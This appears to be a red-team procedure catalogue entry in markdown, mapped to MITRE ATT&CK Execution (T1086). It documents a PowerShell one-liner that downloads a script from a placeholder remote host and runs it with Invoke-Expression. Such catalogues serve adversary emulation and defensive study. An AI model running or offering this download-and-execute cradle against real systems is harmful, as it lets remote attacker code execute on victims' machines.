---
id: 6487f808-0d6b-488a-87f1-3a4e616a0bf6
name: Download and Execute a PowerShell Script
type: procedure
verified: false
submitted: false
created_at: '2019-12-18T18:18:05.679554+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[PowerShell|T1086 - PowerShell]]'
platforms:
- Windows
tags:
- '[[Network]]'
- '[[powershell]]'
commands:
- '[[Invoke-Expression (New-Object Net.WebClient).downl]]'
- '[[Download and Execute PowerShell Script (Invoke-Expression)]]'
---

# Download and Execute a PowerShell Script

## Summary

PowerShell 2.0+ can execute .ps1 scripts hosted on remote systems using the "Invoke-Expression" cmdlet. 

## Description

# Description

PowerShell 2.0+ can execute .ps1 scripts hosted on remote systems using the "Invoke-Expression" cmdlet. 



# Instructions





**Command** ([[Invoke-Expression (New-Object Net.WebClient).downl]]):

```bash
Invoke-Expression (New-Object Net.WebClient).downloadString("http://$_REMOTE_IP/$_FILENAME.ps1")
```





## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[PowerShell|T1086 - PowerShell]]

## Commands Used

- [[Invoke-Expression (New-Object Net.WebClient).downl]]
- [[Download and Execute PowerShell Script (Invoke-Expression)]]

## Tags

- [[Network]]
- [[powershell]]


